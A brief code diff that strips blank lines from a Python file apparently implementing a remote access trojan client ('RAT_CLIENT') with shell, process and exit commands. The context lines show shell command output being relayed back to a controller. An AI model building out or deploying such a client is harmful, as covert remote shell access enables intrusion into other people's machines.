@@ -9,8 +9,6 @@ class Command(Enum):
     SHELL = '1'
     PROC = '2'
     EXIT = '3'
-    
-
 
 
 class RAT_CLIENT:
@@ -90,15 +88,6 @@ class RAT_CLIENT:
                 self.send_buf.put(Command.SHELL.value+result.stderr)
         
                     
-                
-        
-    
-        
-
-                    
-                 
-            
-            
     
 if __name__ == "__main__":
     host = "127.0.0.1"
